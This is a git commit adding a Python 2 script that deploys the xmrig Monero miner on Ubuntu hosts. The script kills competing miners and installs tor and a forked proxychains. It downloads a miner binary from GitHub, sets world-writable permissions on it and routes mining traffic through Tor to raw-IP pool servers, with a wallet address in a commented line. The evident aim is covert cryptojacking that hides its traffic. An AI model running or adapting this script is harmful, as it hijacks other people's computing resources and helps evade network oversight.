63e98670ed17a479c4442c4864ccc6f53d8b9414
nhatquanglan <nhatquanglan@gmail.com>
2019-10-04 13:40:59 +0700

    Add files via upload

---
+++ 155_138/daoxmrig_ubuntu_tor_docker_442.py
@@ -0,0 +1,41 @@
+__author__ = 'root'
+import time
+import urllib2
+import urllib
+import os,sys
+from httplib import BadStatusLine
+from socket import error as socket_error
+import multiprocessing
+import ast
+useproxy = 0
+os.system('chmod 777 ' + __file__)
+program = 'xmrig'
+os.system('pkill ' + program)
+cores = multiprocessing.cpu_count() - 1
+if cores <= 0:
+    cores = 1
+os.system('sysctl -w vm.nr_hugepages=$((`grep -c ^processor /proc/cpuinfo` * 3))')
+try:
+    os.system('apt-get update -y')
+    os.system('apt-get install gcc make tor python python-dev -y')
+    os.system('rm -rf proxychains-ng')
+    os.system('git clone https://github.com/nhatquanglan/proxychains-ng.git')
+    os.chdir('proxychains-ng')
+    os.system('make')
+    os.system('make install')
+    os.system('make install-config')
+    if os.path.isfile('/usr/local/bin/' + program) == False:
+        os.system('wget https://github.com/nhatquanglan/daovps/raw/master/xmrig_tls/' + program)
+        os.system('chmod 777 ' + program)
+        workingdir = os.getcwd()
+        os.system('ln -s -f ' + workingdir + '/' + program + ' ' +'/usr/local/bin/' + program)
+        os.system('ln -s -f ' + workingdir + '/' + program + ' ' + '/usr/bin/' + program)
+        time.sleep (2)
+except:
+    pass
+#os.system ('xmrig --av=7 --variant 1 --donate-level=0 -o stratum+tcp://pool.minexmr.com:4444 -u 43ZBkWEBNvSYQDsEMMCktSFHrQZTDwwyZfPp43FQknuy4UD3qhozWMtM4kKRyrr2Nk66JEiTypfvPbkFd5fGXbA1LxwhFZf+20001')
+#os.system ('xmrig --av=5 -o stratum+tcp://144.202.23.108:4444')
+os.system('tor &')
+time.sleep(60)
+#os.system ('proxychains4 ' + program + ' --donate-level 1 -o stratum+tcp://66.42.53.57:442 --tls -t ' + str(cores))
+os.system ('proxychains4 ' + program + ' --donate-level 1 -o stratum+tcp://155.138.227.135:442 --tls -t ' + str(cores))
